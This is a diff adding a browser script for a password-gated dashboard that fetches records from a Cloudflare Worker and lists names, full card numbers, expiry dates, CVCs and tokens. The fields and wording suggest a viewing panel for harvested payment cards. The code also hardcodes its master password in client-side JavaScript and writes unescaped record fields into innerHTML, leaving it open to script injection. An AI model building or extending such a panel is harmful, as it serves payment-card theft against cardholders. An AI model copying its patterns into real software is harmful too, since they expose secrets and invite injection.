@@ -1,0 +1,56 @@
+<script>
+    // System Master key
+    const SYSTEM_KEY = "poi147258";
+    const WORKER_API_ENDPOINT = "https://workers.dev"; // 💡 Replace with your exact Worker URL
+
+    function verifyLogin() {
+        const pass = document.getElementById('admin-password').value;
+        if (pass === SYSTEM_KEY) {
+            fetchRecordsFromCloud(pass);
+        } else {
+            alert("Password error! Clearance refused.");
+        }
+    }
+
+    async function fetchRecordsFromCloud(passkey) {
+        const tbody = document.getElementById('table-body');
+        tbody.innerHTML = '<tr><td colspan="7" style="text-align: center; color: #38bdf8;">Connecting to Cloudflare KV Data vault...</td></tr>';
+
+        try {
+            const response = await fetch(WORKER_API_ENDPOINT, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password: passkey })
+            });
+
+            if (!response.ok) throw new Error("Authentication node tracking fault.");
+            
+            const dataList = await response.json();
+            
+            document.getElementById('login-section').style.display = 'none';
+            document.getElementById('dashboard-section').style.display = 'block';
+            
+            tbody.innerHTML = '';
+            if (dataList.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="7" style="text-align: center; color: #6b7280; padding: 30px;">Database empty. No customer streaming found.</td></tr>`;
+                return;
+            }
+
+            dataList.forEach((row, index) => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td>${index + 1}</td>
+                    <td style="color:#9ca3af;">${row.time}</td>
+                    <td><span style="color:#3b82f6; font-weight:bold;">${row.name}</span></td>
+                    <td><code>${row.cardNumber}</code></td>
+                    <td><span style="color:#d1d5db;">${row.expiry}</span></td>
+                    <td><span style="color:#d1d5db;">${row.cvc}</span></td>
+                    <td><span class="token-text" title="${row.token}">${row.token}</span></td>
+                `;
+                tbody.appendChild(tr);
+            });
+        } catch (err) {
+            tbody.innerHTML = `<tr><td colspan="7" style="text-align: center; color: #dc2626; padding: 30px;">Egress Failure: ${err.message}</td></tr>`;
+        }
+    }
+</script>
